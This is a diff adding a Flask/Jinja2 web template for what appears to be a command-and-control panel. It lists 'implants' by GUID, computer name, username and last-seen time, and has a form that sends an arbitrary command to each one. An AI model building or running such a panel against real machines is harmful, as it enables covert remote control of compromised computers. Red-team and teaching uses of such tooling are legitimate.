@@ -1,0 +1,48 @@
+{% extends 'base.html' %}
+
+{% block head %}
+<title>Task Master</title>
+{% endblock %}
+
+{% block body %}
+<div class="content">
+    <h1 style="text-align: center">Control Panel</h1>
+    {% if implants|length < 1 %}
+    <h4 style="text-align: center">There are no implants!</h4>
+    {% else %}
+    <table>
+        <tr>
+            <th>Implant Guid</th>
+            <th>Computer Name</th>
+            <th>Username</th>
+            <th>Date Created</th>
+            <th>Last Seen</th>
+            <th>Actions</th>
+            <th></th>
+        </tr>
+        {% for implant in implants %}
+            <tr>
+                <td>{{ implant.guid }}</td>
+                <td>{{ implant.computerName }}</td>
+                <td>{{ implant.username }}</td>
+                <td>{{ implant.dateCreated.date() }}</td>
+                <td>{{ implant.lastSeen }}</td>
+                <td>
+                    <a href="/jobs/{{implant.guid}}">Details</a>
+                </td>
+                <td>
+                    <div class="form">
+                        <form action="/job/add/{{implant.guid}}" method="POST">
+                            <input type="text" name="command" id="command">
+                            <input type="submit" value="Send Command">
+                        </form>
+                    </div>
+                </td>
+            </tr>
+        {% endfor %}
+    </table>
+    {% endif %}
+
+    
+</div>
+{% endblock %}
